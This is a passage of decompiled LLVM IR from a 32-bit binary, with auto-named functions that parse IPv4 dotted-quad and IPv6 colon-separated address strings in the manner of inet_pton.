  %v1_80516ec24 = icmp eq i1 %v4_80516ea23, false
  br i1 %v1_80516ec24, label %dec_label_pc_80516e3, label %dec_label_pc_8051700

dec_label_pc_8051700:                             ; preds = %dec_label_pc_80516d4, %dec_label_pc_80516f0, %dec_label_pc_80516fc, %dec_label_pc_80516e7
  %v0_805170017 = phi i32 [ %v0_805170035, %dec_label_pc_80516e7 ], [ %v0_805170035, %dec_label_pc_80516fc ], [ 0, %dec_label_pc_80516d4 ], [ %v1_80516f4, %dec_label_pc_80516f0 ]
  ret i32 %v0_805170017

; uselistorder directives
  uselistorder i32 %v6_80516e822, { 1, 0 }
  uselistorder i8 %v2_80516e819, { 1, 2, 0 }
  uselistorder i32 %v1_80516f5, { 1, 0 }
  uselistorder i32 %v6_80516e8, { 1, 0 }
  uselistorder i8 %v2_80516e8, { 1, 2, 0 }
  uselistorder i32 %v1_80516e7, { 2, 1, 0 }
  uselistorder i8 %v2_80516f630, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051700, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_80516fc, { 1, 0 }
}

define i32 @function_8051708(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051708:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_805170a = load i32, i32* @esi, align 4
  %v0_8051711 = load i32, i32* @eax, align 4
  store i32 %v0_8051711, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8051717 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8051717, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_805175f15 = inttoptr i32 %v0_8051711 to i8*
  %v2_805175f16 = load i8, i8* %v1_805175f15, align 1
  %v3_805175f17 = sext i8 %v2_805175f16 to i32
  store i32 %v3_805175f17, i32* @ecx, align 4
  %v1_805176218 = add i32 %v0_8051711, 1
  store i32 %v1_805176218, i32* %ebx.global-to-local, align 4
  %v1_805176319 = icmp eq i8 %v2_805175f16, 0
  %v1_805176520 = icmp eq i1 %v1_805176319, false
  br i1 %v1_805176520, label %dec_label_pc_8051722, label %dec_label_pc_8051767.thread

dec_label_pc_8051767.thread:                      ; preds = %dec_label_pc_8051708
  br label %dec_label_pc_8051784

dec_label_pc_8051722:                             ; preds = %dec_label_pc_8051708, %dec_label_pc_805175f.backedge
  %v3_805175f22 = phi i32 [ %v3_805175f, %dec_label_pc_805175f.backedge ], [ %v3_805175f17, %dec_label_pc_8051708 ]
  %v2_805175f21 = phi i8 [ %v2_805175f, %dec_label_pc_805175f.backedge ], [ %v2_805175f16, %dec_label_pc_8051708 ]
  %v1_8051722 = add nsw i32 %v3_805175f22, -48
  store i32 %v1_8051722, i32* %eax.global-to-local, align 4
  %v6_8051728 = icmp ugt i32 %v1_8051722, 9
  br i1 %v6_8051728, label %dec_label_pc_805174b, label %dec_label_pc_805172a

dec_label_pc_805172a:                             ; preds = %dec_label_pc_8051722
  %v0_805172a = load i32, i32* @esi, align 4
  %v1_805172a = inttoptr i32 %v0_805172a to i8*
  %v2_805172a = load i8, i8* %v1_805172a, align 1
  %v2_805172d = zext i8 %v2_805172a to i32
  %v3_805172d = mul nuw nsw i32 %v2_805172d, 10
  %v3_8051730 = add nsw i32 %v3_805172d, %v1_8051722
  store i32 %v3_8051730, i32* %eax.global-to-local, align 4
  %v6_8051739 = icmp ugt i32 %v3_8051730, 255
  br i1 %v6_8051739, label %dec_label_pc_8051784, label %dec_label_pc_805173b

dec_label_pc_805173b:                             ; preds = %dec_label_pc_805172a
  %v1_805173b = trunc i32 %v3_8051730 to i8
  store i8 %v1_805173b, i8* %v1_805172a, align 1
  %v0_805173d = load i32, i32* @edx, align 4
  %v1_805173d = icmp eq i32 %v0_805173d, 0
  %v1_805173f = icmp eq i1 %v1_805173d, false
  br i1 %v1_805173f, label %dec_label_pc_805175f.backedge, label %dec_label_pc_8051741

dec_label_pc_8051741:                             ; preds = %dec_label_pc_805173b
  %v0_8051741 = load i32, i32* @edi, align 4
  %v1_8051741 = add i32 %v0_8051741, 1
  store i32 %v1_8051741, i32* @edi, align 4
  %v1_8051742 = add i32 %v0_8051741, -3
  %v6_8051742 = sub i32 2, %v0_8051741
  %v7_8051742 = and i32 %v6_8051742, %v1_8051741
  %v8_8051742 = icmp slt i32 %v7_8051742, 0
  %v9_8051742 = icmp eq i32 %v1_8051742, 0
  %v10_8051742 = icmp slt i32 %v1_8051742, 0
  %v3_8051745 = icmp eq i1 %v10_8051742, %v8_8051742
  %v4_8051745 = icmp eq i1 %v9_8051742, false
  %v5_8051745 = and i1 %v4_8051745, %v3_8051745
  br i1 %v5_8051745, label %dec_label_pc_8051784, label %dec_label_pc_8051747

dec_label_pc_8051747:                             ; preds = %dec_label_pc_8051741
  %v1_8051747 = and i32 %v0_805173d, -256
  %v2_8051747 = or i32 %v1_8051747, 1
  store i32 %v2_8051747, i32* @edx, align 4
  br label %dec_label_pc_805175f.backedge

dec_label_pc_805174b:                             ; preds = %dec_label_pc_8051722
  %v9_805174b = icmp eq i8 %v2_805175f21, 46
  %v1_805174e = icmp eq i1 %v9_805174b, false
  br i1 %v1_805174e, label %dec_label_pc_8051784, label %dec_label_pc_8051750

dec_label_pc_8051750:                             ; preds = %dec_label_pc_805174b
  %v0_8051750 = load i32, i32* @edx, align 4
  %v1_8051750 = icmp eq i32 %v0_8051750, 0
  br i1 %v1_8051750, label %dec_label_pc_8051784, label %dec_label_pc_8051754

dec_label_pc_8051754:                             ; preds = %dec_label_pc_8051750
  %v0_8051754 = load i32, i32* @edi, align 4
  %v9_8051754 = icmp eq i32 %v0_8051754, 4
  br i1 %v9_8051754, label %dec_label_pc_8051784, label %dec_label_pc_8051759

dec_label_pc_8051759:                             ; preds = %dec_label_pc_8051754
  %v0_8051759 = load i32, i32* @esi, align 4
  %v1_8051759 = add i32 %v0_8051759, 1
  store i32 %v1_8051759, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_805175c = inttoptr i32 %v1_8051759 to i8*
  store i8 0, i8* %v1_805175c, align 1
  br label %dec_label_pc_805175f.backedge

dec_label_pc_805175f.backedge:                    ; preds = %dec_label_pc_8051759, %dec_label_pc_8051747, %dec_label_pc_805173b
  %v0_805175f.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805175f = inttoptr i32 %v0_805175f.pre to i8*
  %v2_805175f = load i8, i8* %v1_805175f, align 1
  %v3_805175f = sext i8 %v2_805175f to i32
  store i32 %v3_805175f, i32* @ecx, align 4
  %v1_8051762 = add i32 %v0_805175f.pre, 1
  store i32 %v1_8051762, i32* %ebx.global-to-local, align 4
  %v1_8051763 = icmp eq i8 %v2_805175f, 0
  %v1_8051765 = icmp eq i1 %v1_8051763, false
  br i1 %v1_8051765, label %dec_label_pc_8051722, label %dec_label_pc_8051767

dec_label_pc_8051767:                             ; preds = %dec_label_pc_805175f.backedge
  %v0_8051767.pre = load i32, i32* @edi, align 4
  %v7_805176a = icmp sgt i32 %v0_8051767.pre, 3
  br i1 %v7_805176a, label %dec_label_pc_805176c, label %dec_label_pc_8051784

dec_label_pc_805176c:                             ; preds = %dec_label_pc_8051767
  %v0_805176c = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_8051717, i32* %eax.global-to-local, align 4
  %v3_8051775 = bitcast i32* %stack_var_-20 to i16*
  %v4_8051775 = call i32 @function_804d150(i16* %v3_8051775, i32 4, i32 %v0_805176c)
  br label %dec_label_pc_8051786

dec_label_pc_8051784:                             ; preds = %dec_label_pc_8051754, %dec_label_pc_8051750, %dec_label_pc_805174b, %dec_label_pc_8051741, %dec_label_pc_805172a, %dec_label_pc_8051767.thread, %dec_label_pc_8051767
  br label %dec_label_pc_8051786

dec_label_pc_8051786:                             ; preds = %dec_label_pc_805176c, %dec_label_pc_8051784
  %storemerge = phi i32 [ 0, %dec_label_pc_8051784 ], [ 1, %dec_label_pc_805176c ]
  %v0_805178d = phi i32 [ 0, %dec_label_pc_8051784 ], [ 1, %dec_label_pc_805176c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805170a, i32* @esi, align 4
  ret i32 %v0_805178d

; uselistorder directives
  uselistorder i32 %v3_805175f, { 1, 0 }
  uselistorder i8 %v2_805175f, { 1, 2, 0 }
  uselistorder i32 %v1_8051742, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 255, { 5, 1, 6, 7, 8, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_8051786, { 1, 0 }
  uselistorder label %dec_label_pc_8051784, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8051722, { 1, 0 }
}

define i32 @function_805178e(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805178e:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805178e = load i32, i32* @ebp, align 4
  %v0_805178f = load i32, i32* @edi, align 4
  %v0_8051790 = load i32, i32* @esi, align 4
  %v0_8051791 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_8051799 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8051799, i32* @edi, align 4
  %v9_805179d = icmp eq i32 %arg1, 2
  br i1 %v9_805179d, label %dec_label_pc_80517ad, label %dec_label_pc_80517a2

dec_label_pc_80517a2:                             ; preds = %dec_label_pc_805178e
  %v9_80517a2 = icmp eq i32 %arg1, 10
  %v1_80517a5 = icmp eq i1 %v9_80517a2, false
  br i1 %v1_80517a5, label %dec_label_pc_805193e, label %dec_label_pc_80517bd

dec_label_pc_80517ad:                             ; preds = %dec_label_pc_805178e
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_8051799, i32* @eax, align 4
  %v3_80517b3 = call i32 @function_8051708(i32 %v0_8051791, i32 %v0_8051790, i32 %v0_805178f)
  store i32 %v3_80517b3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051950

dec_label_pc_80517bd:                             ; preds = %dec_label_pc_80517a2
  %v2_80517c2 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80517c2, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-32 to i8*
  %v5_80517c7 = call i32 @function_804d178(i8* %tmp61, i32 0, i32 16)
  store i32 %v5_80517c7, i32* @ebx, align 4
  %v2_80517ce = add i32 %v5_80517c7, 16
  store i32 %v2_80517ce, i32* %eax.global-to-local, align 4
  %v0_80517d8 = load i32, i32* @edi, align 4
  %v1_80517d8 = inttoptr i32 %v0_80517d8 to i8*
  %v2_80517d8 = load i8, i8* %v1_80517d8, align 1
  %v11_80517d8 = icmp eq i8 %v2_80517d8, 58
  %v1_80517db = icmp eq i1 %v11_80517d8, false
  br i1 %v1_80517db, label %dec_label_pc_805186e, label %dec_label_pc_80517dd

dec_label_pc_80517dd:                             ; preds = %dec_label_pc_80517bd
  %v1_80517dd = add i32 %v0_80517d8, 1
  store i32 %v1_80517dd, i32* @edi, align 4
  %v1_80517de = inttoptr i32 %v1_80517dd to i8*
  %v2_80517de = load i8, i8* %v1_80517de, align 1
  %v11_80517de = icmp eq i8 %v2_80517de, 58
  %v1_80517e1 = icmp eq i1 %v11_80517de, false
  br i1 %v1_80517e1, label %dec_label_pc_805194e, label %dec_label_pc_805186e

dec_label_pc_80517f5:                             ; preds = %dec_label_pc_80518ae
  %v0_80517f5 = load i32, i32* @ecx, align 4
  %v7_80517fd = call i32 @function_80522c0(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8054cb4.208, i32 0, i32 0), i32 %v2_80518b5, i32 %v0_80517f5, i32 %v0_80517f5)
  store i32 %v7_80517fd, i32* %eax.global-to-local, align 4
  %v0_8051802 = load i32, i32* @edi, align 4
  %v1_8051802 = add i32 %v0_8051802, 1
  store i32 %v1_8051802, i32* @edi, align 4
  %v1_8051806 = icmp eq i32 %v7_80517fd, 0
  br i1 %v1_8051806, label %dec_label_pc_8051825, label %dec_label_pc_805180a

dec_label_pc_805180a:                             ; preds = %dec_label_pc_80517f5
  %v0_805180a = load i32, i32* @ebp, align 4
  %v2_805180a = mul i32 %v0_805180a, 16
  %v1_805180d = add i32 %v7_80517fd, -134565044
  store i32 %v1_805180d, i32* %eax.global-to-local, align 4
  %v2_8051812 = or i32 %v2_805180a, %v1_805180d
  store i32 %v2_8051812, i32* @ebp, align 4
  %tmp127 = icmp ult i32 %v2_8051812, 65536
  br i1 %tmp127, label %dec_label_pc_80518ae.outer, label %dec_label_pc_805194e

dec_label_pc_80518ae.outer:                       ; preds = %dec_label_pc_805180a, %dec_label_pc_805186e
  %v0_80518b137 = phi i32 [ %v1_8051802, %dec_label_pc_805180a ], [ %stack_var_-36.0.in, %dec_label_pc_805186e ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_805180a ], [ %stack_var_-44.0, %dec_label_pc_805186e ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_805180a ], [ %stack_var_-36.0, %dec_label_pc_805186e ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_805180a ], [ 0, %dec_label_pc_805186e ]
  %v4_805182a = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_805182f = icmp eq i1 %v4_805182a, false
  br label %dec_label_pc_80518ae

dec_label_pc_8051825:                             ; preds = %dec_label_pc_80517f5
  %v0_8051825 = load i32, i32* @esi, align 4
  %v9_8051825 = icmp eq i32 %v0_8051825, 58
  %v1_8051828 = icmp eq i1 %v9_8051825, false
  br i1 %v1_8051828, label %dec_label_pc_805187a, label %dec_label_pc_805182a

dec_label_pc_805182a:                             ; preds = %dec_label_pc_8051825
  br i1 %v1_805182f, label %dec_label_pc_8051846, label %dec_label_pc_8051831

dec_label_pc_8051831:                             ; preds = %dec_label_pc_805182a
  %v5_8051831 = icmp eq i8* %stack_var_-44.1, null
  %v1_8051836 = icmp eq i1 %v5_8051831, false
  br i1 %v1_8051836, label %dec_label_pc_805194e, label %dec_label_pc_805183c

dec_label_pc_805183c:                             ; preds = %dec_label_pc_8051831
  %v0_805183c = load i32, i32* @ebx, align 4
  %v5_805183c = inttoptr i32 %v0_805183c to i8*
  %v5_8051840 = inttoptr i32 %v1_8051802 to i8*
  br label %dec_label_pc_80518ae

dec_label_pc_8051846:                             ; preds = %dec_label_pc_805182a
  %v1_8051846 = inttoptr i32 %v1_8051802 to i8*
  %v2_8051846 = load i8, i8* %v1_8051846, align 1
  %v3_8051846 = icmp eq i8 %v2_8051846, 0
  br i1 %v3_8051846, label %dec_label_pc_805194e, label %dec_label_pc_805184f

dec_label_pc_805184f:                             ; preds = %dec_label_pc_8051846
  %v0_805184f = load i32, i32* @ebx, align 4
  %v1_805184f = add i32 %v0_805184f, 2
  store i32 %v1_805184f, i32* @edx, align 4
  %v6_8051856 = icmp ugt i32 %v1_805184f, %v2_80517ce
  br i1 %v6_8051856, label %dec_label_pc_805194e, label %dec_label_pc_805185c

dec_label_pc_805185c:                             ; preds = %dec_label_pc_805184f
  %v0_805185c = load i32, i32* @ebp, align 4
  %v2_805185e = udiv i32 %v0_805185c, 256
  %v4_805185e = trunc i32 %v2_805185e to i8
  %v3_8051861 = inttoptr i32 %v0_805184f to i8*
  store i8 %v4_805185e, i8* %v3_8051861, align 1
  %v0_8051863 = load i32, i32* @ebp, align 4
  store i32 %v0_8051863, i32* %eax.global-to-local, align 4
  %v1_8051865 = trunc i32 %v0_8051863 to i8
  %v2_8051865 = load i32, i32* @ebx, align 4
  %v3_8051865 = add i32 %v2_8051865, 1
  %v4_8051865 = inttoptr i32 %v3_8051865 to i8*
  store i8 %v1_8051865, i8* %v4_8051865, align 1
  %v0_8051868 = load i32, i32* @edx, align 4
  store i32 %v0_8051868, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805186e

dec_label_pc_805186e:                             ; preds = %dec_label_pc_80517bd, %dec_label_pc_80517dd, %dec_label_pc_805185c
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_805185c ], [ %v1_80517dd, %dec_label_pc_80517dd ], [ %v0_80517d8, %dec_label_pc_80517bd ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_805185c ], [ null, %dec_label_pc_80517dd ], [ null, %dec_label_pc_80517bd ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80518ae.outer

dec_label_pc_805187a:                             ; preds = %dec_label_pc_8051825
  %v9_805187a = icmp eq i32 %v0_8051825, 46
  %v1_805187d = icmp eq i1 %v9_805187a, false
  br i1 %v1_805187d, label %dec_label_pc_805194e, label %dec_label_pc_8051883

dec_label_pc_8051883:                             ; preds = %dec_label_pc_805187a
  %v0_8051883 = load i32, i32* @ebx, align 4
  %v1_8051883 = add i32 %v0_8051883, 4
  store i32 %v1_8051883, i32* @esi, align 4
  %v6_805188a = icmp ugt i32 %v1_8051883, %v2_80517ce
  br i1 %v6_805188a, label %dec_label_pc_805194e, label %dec_label_pc_8051890

dec_label_pc_8051890:                             ; preds = %dec_label_pc_8051883
  store i32 %v0_8051883, i32* @edx, align 4
  %v4_8051892 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_8051892, i32* @eax, align 4
  %v2_8051896 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8051896 = call i32 @function_8051708(i32 %stack_var_-48.0.ph, i32 %v2_8051896, i32 %v2_80517ce)
  store i32 %v5_8051896, i32* %eax.global-to-local, align 4
  %v0_805189b = load i32, i32* @esi, align 4
  %tmp62 = icmp slt i32 %v5_8051896, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_80518e5, label %dec_label_pc_805194e

dec_label_pc_80518ae:                             ; preds = %dec_label_pc_80518ae.outer, %dec_label_pc_805183c
  %v0_80518b1 = phi i32 [ %v1_8051802, %dec_label_pc_805183c ], [ %v0_80518b137, %dec_label_pc_80518ae.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_805183c, %dec_label_pc_805183c ], [ %stack_var_-44.1.ph, %dec_label_pc_80518ae.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_8051840, %dec_label_pc_805183c ], [ %stack_var_-36.1.ph, %dec_label_pc_80518ae.outer ]
  %v1_80518b1 = inttoptr i32 %v0_80518b1 to i8*
  %v2_80518b1 = load i8, i8* %v1_80518b1, align 1
  %v3_80518b1 = sext i8 %v2_80518b1 to i32
  store i32 %v3_80518b1, i32* %eax.global-to-local, align 4
  %v2_80518b5 = call i32 @function_80522a0(i32 %v3_80518b1)
  store i32 %v2_80518b5, i32* %eax.global-to-local, align 4
  store i32 %v2_80518b5, i32* @esi, align 4
  %v1_80518bf = icmp eq i32 %v2_80518b5, 0
  %v1_80518c1 = icmp eq i1 %v1_80518bf, false
  br i1 %v1_80518c1, label %dec_label_pc_80517f5, label %dec_label_pc_80518c7

dec_label_pc_80518c7:                             ; preds = %dec_label_pc_80518ae
  %v0_805191d.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_805182a, label %dec_label_pc_80518e5, label %dec_label_pc_80518ce

dec_label_pc_80518ce:                             ; preds = %dec_label_pc_80518c7
  %v1_80518ce = add i32 %v0_805191d.pre.pre, 2
  store i32 %v1_80518ce, i32* @edx, align 4
  %v6_80518d5 = icmp ugt i32 %v1_80518ce, %v2_80517ce
  br i1 %v6_80518d5, label %dec_label_pc_805194e, label %dec_label_pc_80518d7

dec_label_pc_80518d7:                             ; preds = %dec_label_pc_80518ce
  %v0_80518d7 = load i32, i32* @ebp, align 4
  %v2_80518d9 = udiv i32 %v0_80518d7, 256
  %v4_80518d9 = trunc i32 %v2_80518d9 to i8
  %v3_80518dc = inttoptr i32 %v0_805191d.pre.pre to i8*
  store i8 %v4_80518d9, i8* %v3_80518dc, align 1
  %v0_80518de = load i32, i32* @ebp, align 4
  store i32 %v0_80518de, i32* %eax.global-to-local, align 4
  %v1_80518e0 = trunc i32 %v0_80518de to i8
  %v2_80518e0 = load i32, i32* @ebx, align 4
  %v3_80518e0 = add i32 %v2_80518e0, 1
  %v4_80518e0 = inttoptr i32 %v3_80518e0 to i8*
  store i8 %v1_80518e0, i8* %v4_80518e0, align 1
  %v0_80518e3 = load i32, i32* @edx, align 4
  br label %dec_label_pc_80518e5

dec_label_pc_80518e5:                             ; preds = %dec_label_pc_80518c7, %dec_label_pc_8051890, %dec_label_pc_80518d7
  %v0_805191d.pre = phi i32 [ %v0_805189b, %dec_label_pc_8051890 ], [ %v0_80518e3, %dec_label_pc_80518d7 ], [ %v0_805191d.pre.pre, %dec_label_pc_80518c7 ]
  %v4_80518e5 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_80518e5 = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_80518e5, label %dec_label_pc_805191d, label %dec_label_pc_80518ec

dec_label_pc_80518ec:                             ; preds = %dec_label_pc_80518e5
  store i32 1, i32* @esi, align 4
  %v6_80518f3 = sub i32 %v0_805191d.pre, %v4_80518e5
  store i32 %v6_80518f3, i32* @edi, align 4
  %v16_80518f7 = icmp eq i32 %v0_805191d.pre, %v2_80517ce
  %v1_80518fb = icmp eq i1 %v16_80518f7, false
  br i1 %v1_80518fb, label %dec_label_pc_8051915.preheader, label %dec_label_pc_805194e

dec_label_pc_8051915.preheader:                   ; preds = %dec_label_pc_80518ec
  %v3_805191595 = inttoptr i32 %v6_80518f3 to i8*
  %v9_805191798 = icmp slt i8* %v3_805191595, inttoptr (i32 1 to i8*)
  br i1 %v9_805191798, label %dec_label_pc_805191d.thread, label %dec_label_pc_80518ff

dec_label_pc_80518ff:                             ; preds = %dec_label_pc_8051915.preheader, %dec_label_pc_80518ff
  %v0_805190d100 = phi i32 [ %v0_8051915.pre, %dec_label_pc_80518ff ], [ 1, %dec_label_pc_8051915.preheader ]
  %v0_80518ff99 = phi i32 [ %v1_8051915.pre, %dec_label_pc_80518ff ], [ %v6_80518f3, %dec_label_pc_8051915.preheader ]
  %v2_8051905 = sub i32 %v0_80518ff99, %v0_805190d100
  %v2_8051907 = sub i32 %v2_80517ce, %v0_805190d100
  %v6_8051909 = add i32 %v2_8051905, %v4_80518e5
  store i32 %v6_8051909, i32* %eax.global-to-local, align 4
  %v1_805190d = add i32 %v0_805190d100, 1
  store i32 %v1_805190d, i32* @esi, align 4
  %v1_805190e = inttoptr i32 %v6_8051909 to i8*
  %v2_805190e = load i8, i8* %v1_805190e, align 1
  %v3_805190e = zext i8 %v2_805190e to i32
  %v4_805190e = load i32, i32* @edx, align 4
  %v5_805190e = and i32 %v4_805190e, -256
  %v6_805190e = or i32 %v5_805190e, %v3_805190e
  store i32 %v6_805190e, i32* @edx, align 4
  %v3_8051910 = inttoptr i32 %v2_8051907 to i8*
  store i8 %v2_805190e, i8* %v3_8051910, align 1
  %v0_8051912 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051912 = inttoptr i32 %v0_8051912 to i8*
  store i8 0, i8* %v1_8051912, align 1
  %v0_8051915.pre = load i32, i32* @esi, align 4
  %v1_8051915.pre = load i32, i32* @edi, align 4
  %v2_8051915 = inttoptr i32 %v0_8051915.pre to i8*
  %v3_8051915 = inttoptr i32 %v1_8051915.pre to i8*
  %v9_8051917 = icmp sgt i8* %v2_8051915, %v3_8051915
  br i1 %v9_8051917, label %dec_label_pc_805191d.thread, label %dec_label_pc_80518ff

dec_label_pc_805191d.thread:                      ; preds = %dec_label_pc_80518ff, %dec_label_pc_8051915.preheader
  br label %dec_label_pc_8051923

dec_label_pc_805191d:                             ; preds = %dec_label_pc_80518e5
  %v16_805191d = icmp eq i32 %v0_805191d.pre, %v2_80517ce
  %v1_8051921 = icmp eq i1 %v16_805191d, false
  br i1 %v1_8051921, label %dec_label_pc_805194e, label %dec_label_pc_8051923

dec_label_pc_8051923:                             ; preds = %dec_label_pc_805191d.thread, %dec_label_pc_805191d
  store i32 %v2_80517c2, i32* %eax.global-to-local, align 4
  %tmp64 = inttoptr i32 %arg3 to i16*
  %v5_805192f = call i32 @function_804d150(i16* %tmp64, i32 %v2_80517c2, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051950

dec_label_pc_805193e:                             ; preds = %dec_label_pc_80517a2
  %v1_805193e = call i32 @function_804b774(i32 %v0_8051791)
  %v1_8051943 = inttoptr i32 %v1_805193e to i32*
  store i32 97, i32* %v1_8051943, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051950

dec_label_pc_805194e:                             ; preds = %dec_label_pc_805184f, %dec_label_pc_8051846, %dec_label_pc_805180a, %dec_label_pc_8051831, %dec_label_pc_80518ec, %dec_label_pc_8051890, %dec_label_pc_805191d, %dec_label_pc_80518ce, %dec_label_pc_8051883, %dec_label_pc_805187a, %dec_label_pc_80517dd
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051950

dec_label_pc_8051950:                             ; preds = %dec_label_pc_805193e, %dec_label_pc_8051923, %dec_label_pc_80517ad, %dec_label_pc_805194e
  %v0_8051957 = phi i32 [ -1, %dec_label_pc_805193e ], [ 1, %dec_label_pc_8051923 ], [ %v3_80517b3, %dec_label_pc_80517ad ], [ 0, %dec_label_pc_805194e ]
  store i32 %v0_8051791, i32* @ebx, align 4
  store i32 %v0_8051790, i32* @esi, align 4
  store i32 %v0_805178f, i32* @edi, align 4
  store i32 %v0_805178e, i32* @ebp, align 4
  ret i32 %v0_8051957

; uselistorder directives
  uselistorder i32 %v1_8051915.pre, { 1, 0 }
  uselistorder i32 %v0_8051915.pre, { 1, 0 }
  uselistorder i32 %v0_805190d100, { 2, 1, 0 }
  uselistorder i32 %v0_805191d.pre, { 2, 1, 0 }
  uselistorder i32 %v0_805191d.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_80518b5, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_8051802, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_80517ce, { 0, 2, 1, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_8051791, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @function_8051708, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8051950, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805194e, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8051923, { 1, 0 }
  uselistorder label %dec_label_pc_80518ff, { 1, 0 }
  uselistorder label %dec_label_pc_80518e5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80518ae, { 1, 0 }
  uselistorder label %dec_label_pc_805186e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80518ae.outer, { 1, 0 }
}

define i32 @function_8051958(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051958:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_8051959 = load i32, i32* @edi, align 4
  %v0_805195a = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v0_8051962 = load i32, i32* @eax, align 4
  %v3_8051966 = and i32 %v0_8051962, -65536
  store i32 %v3_8051966, i32* %stack_var_-33, align 4
  %v2_8051971 = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8051977 = load i32, i32* @edx, align 4
  %v0_805197b = load i32, i32* @ecx, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_8051981 = add i32 %v2_8051971, 4
  store i32 %v6_8051981, i32* %edi.global-to-local, align 4
  %v2_8051982 = inttoptr i32 %v6_8051981 to i32*
  store i32 0, i32* %v2_8051982, align 4
  %v3_8051982 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051982 = add i32 %v3_8051982, 4
  store i32 %v6_8051982, i32* %edi.global-to-local, align 4
  %v0_8051983 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051983 = inttoptr i32 %v6_8051982 to i32*
  store i32 %v0_8051983, i32* %v2_8051983, align 4
  %v3_8051983 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051983 = add i32 %v3_8051983, 4
  store i32 %v6_8051983, i32* %edi.global-to-local, align 4
  %v0_8051984 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051984 = trunc i32 %v0_8051984 to i16
  %v3_8051984 = inttoptr i32 %v6_8051983 to i16*
  store i16 %v1_8051984, i16* %v3_8051984, align 2
